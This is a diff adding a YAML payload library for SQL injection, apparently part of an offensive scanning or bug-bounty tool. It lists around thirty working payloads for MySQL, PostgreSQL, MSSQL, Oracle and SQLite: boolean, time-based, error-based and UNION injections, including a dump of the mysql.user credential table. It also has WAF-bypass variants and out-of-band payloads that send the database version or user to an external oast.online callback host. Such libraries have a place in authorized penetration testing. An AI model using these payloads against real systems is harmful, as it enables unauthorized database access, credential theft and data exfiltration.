@@ -1,0 +1,313 @@
+id: sqli
+name: SQL Injection
+version: 1.0.0
+category: injection
+description: |
+  Payloads for boolean-based, time-based, error-based, UNION-based, second-order,
+  and out-of-band SQL injection across MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
+  and SQLite. WAF bypasses for ModSecurity/CRS, Cloudflare and AWS WAF are
+  grouped under subcategory: waf_bypass.
+mitre:
+  - T1190
+  - T1059.007
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://portswigger.net/web-security/sql-injection
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+  - https://book.hacktricks.xyz/pentesting-web/sql-injection
+related_tools:
+  - sqlmap_crawl
+  - nuclei
+  - jaeles
+  - dalfox
+chains:
+  - bug_bounty_full_v2
+  - web_deep
+
+payloads:
+
+  # ---- Detection ----
+  - id: sqli_detect_quote_break
+    name: Quote-break detection
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "'"
+    notes: Trailing single quote; triggers DB error when reflected in a SQL string context.
+    source: common knowledge
+
+  - id: sqli_detect_double_quote
+    name: Double-quote break detection
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "\""
+    source: common knowledge
+
+  - id: sqli_detect_comment_truncate
+    name: Truncate query with -- comment
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "' OR '1'='1' -- -"
+    notes: Always-true predicate plus inline comment.
+    source: common knowledge
+
+  - id: sqli_detect_math_inference
+    name: Math inference — true/false
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "' AND 1=1 -- -"
+    notes: Pair with "' AND 1=2 -- -" to confirm boolean-based behaviour.
+    source: common knowledge
+
+  # ---- Boolean-based ----
+  - id: sqli_boolean_or_true
+    name: OR-based always-true
+    subcategory: boolean
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "' OR 1=1 -- -"
+    source: common knowledge
+
+  - id: sqli_boolean_substring_inference
+    name: substring inference (MySQL)
+    subcategory: boolean
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' AND SUBSTRING(@@version,1,1)='5' -- -"
+    notes: Iterate the index/char to fingerprint version.
+    source: PortSwigger
+
+  - id: sqli_boolean_postgres_ascii
+    name: Postgres ASCII inference
+    subcategory: boolean
+    encoding: raw
+    tech_targets: [postgres]
+    severity_when_works: critical
+    payload: "' AND ASCII(SUBSTR(current_user,1,1))>96 -- -"
+    source: PortSwigger
+
+  # ---- Time-based ----
+  - id: sqli_time_mysql_sleep
+    name: MySQL SLEEP
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' OR SLEEP(5) -- -"
+    notes: 5-second blocking delay confirms blind SQLi.
+    source: PortSwigger
+
+  - id: sqli_time_mysql_benchmark
+    name: MySQL BENCHMARK
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' OR BENCHMARK(5000000,MD5('a')) -- -"
+    notes: Fallback when SLEEP is blocked.
+    source: common knowledge
+
+  - id: sqli_time_postgres_pg_sleep
+    name: Postgres pg_sleep
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [postgres]
+    severity_when_works: critical
+    payload: "'; SELECT pg_sleep(5) -- -"
+    source: PortSwigger
+
+  - id: sqli_time_mssql_waitfor
+    name: MSSQL WAITFOR DELAY
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [mssql]
+    severity_when_works: critical
+    payload: "'; WAITFOR DELAY '0:0:5' -- -"
+    source: PortSwigger
+
+  - id: sqli_time_oracle_dbms
+    name: Oracle DBMS_PIPE.RECEIVE_MESSAGE
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [oracle]
+    severity_when_works: critical
+    payload: "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -"
+    source: PortSwigger
+
+  - id: sqli_time_sqlite_random
+    name: SQLite recursive CTE delay
+    subcategory: time_based
+    encoding: raw
+    tech_targets: [sqlite]
+    severity_when_works: critical
+    payload: "' AND 1=(WITH RECURSIVE x(a) AS (SELECT 0 UNION SELECT a+1 FROM x WHERE a<10000000) SELECT count(*) FROM x) -- -"
+    notes: SQLite has no sleep; recursive CTE blocks for tunable duration.
+    source: common knowledge
+
+  # ---- Error-based ----
+  - id: sqli_error_mysql_extractvalue
+    name: MySQL ExtractValue error
+    subcategory: error_based
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: high
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -"
+    notes: XPath error leaks the embedded subquery result.
+    source: common knowledge
+
+  - id: sqli_error_mssql_convert
+    name: MSSQL convert-error leak
+    subcategory: error_based
+    encoding: raw
+    tech_targets: [mssql]
+    severity_when_works: high
+    payload: "' AND 1=CONVERT(int,(SELECT @@version)) -- -"
+    source: common knowledge
+
+  - id: sqli_error_postgres_cast
+    name: Postgres cast-error leak
+    subcategory: error_based
+    encoding: raw
+    tech_targets: [postgres]
+    severity_when_works: high
+    payload: "' AND 1=CAST((SELECT current_user) AS int) -- -"
+    source: common knowledge
+
+  # ---- UNION-based ----
+  - id: sqli_union_columns
+    name: UNION column-count probe
+    subcategory: union
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "' UNION SELECT NULL,NULL,NULL -- -"
+    notes: Iterate NULL count until 200 OK.
+    source: PortSwigger
+
+  - id: sqli_union_string_context
+    name: UNION string column probe
+    subcategory: union
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "' UNION SELECT 'a',NULL,NULL -- -"
+    source: PortSwigger
+
+  - id: sqli_union_mysql_concat
+    name: UNION MySQL credential dump
+    subcategory: union
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' UNION SELECT user,password,NULL FROM mysql.user -- -"
+    source: common knowledge
+
+  - id: sqli_union_postgres_dump
+    name: UNION Postgres schema dump
+    subcategory: union
+    encoding: raw
+    tech_targets: [postgres]
+    severity_when_works: critical
+    payload: "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables -- -"
+    source: common knowledge
+
+  # ---- Out-of-band ----
+  - id: sqli_oob_mysql_load_file
+    name: MySQL LOAD_FILE OOB
+    subcategory: out_of_band
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{{interactsh}}.oast.online\\\\\\\\a')) -- -"
+    notes: Windows MySQL with FILE_PRIV; resolve OOB via SMB / DNS.
+    source: PortSwigger
+
+  - id: sqli_oob_mssql_xp_dirtree
+    name: MSSQL xp_dirtree
+    subcategory: out_of_band
+    encoding: raw
+    tech_targets: [mssql]
+    severity_when_works: critical
+    payload: "'; EXEC master..xp_dirtree '\\\\{{interactsh}}.oast.online\\a' -- -"
+    source: HackTricks
+
+  - id: sqli_oob_oracle_utl_http
+    name: Oracle UTL_HTTP OOB
+    subcategory: out_of_band
+    encoding: raw
+    tech_targets: [oracle]
+    severity_when_works: critical
+    payload: "' || (SELECT UTL_HTTP.REQUEST('http://{{interactsh}}.oast.online/'||user) FROM dual) -- -"
+    source: HackTricks
+
+  # ---- Second-order ----
+  - id: sqli_second_order_register
+    name: Second-order via registration
+    subcategory: second_order
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "admin'-- "
+    notes: Register username "admin'-- " then trigger the back-end query (e.g. password reset) that re-uses it.
+    source: PortSwigger
+
+  # ---- WAF bypass ----
+  - id: sqli_waf_inline_comments
+    name: Inline-comment WAF bypass (MySQL)
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [mysql]
+    severity_when_works: critical
+    payload: "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL -- -"
+    notes: Versioned comments execute only on MySQL ≥ 5.0; bypass naive regex WAFs.
+    source: HackTricks
+
+  - id: sqli_waf_whitespace
+    name: Whitespace-strip bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "'/**/OR/**/1=1/**/--%20-"
+    source: HackTricks
+
+  - id: sqli_waf_case_random
+    name: Mixed-case keyword bypass
+    subcategory: waf_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "' UnIoN sElEcT NULL,NULL,NULL -- -"
+    source: common knowledge
+
+  - id: sqli_waf_url_doubleencode
+    name: Double-URL-encode bypass
+    subcategory: waf_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%2527%2520OR%25201%253D1%2520--%2520-"
+    notes: "%25 is the URL-encoded %; decodes once at the front proxy, again at the app."
+    source: common knowledge
+
+  # ---- NoSQL-ish but kept here for chain symmetry ----
+  - id: sqli_postgres_concat_inj
+    name: Postgres CHR concat to dodge quote filters
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [postgres]
+    severity_when_works: critical
+    payload: "' UNION SELECT CHR(97)||CHR(98)||CHR(99) -- -"
+    notes: Build strings with CHR() when single quotes are filtered.
+    source: common knowledge
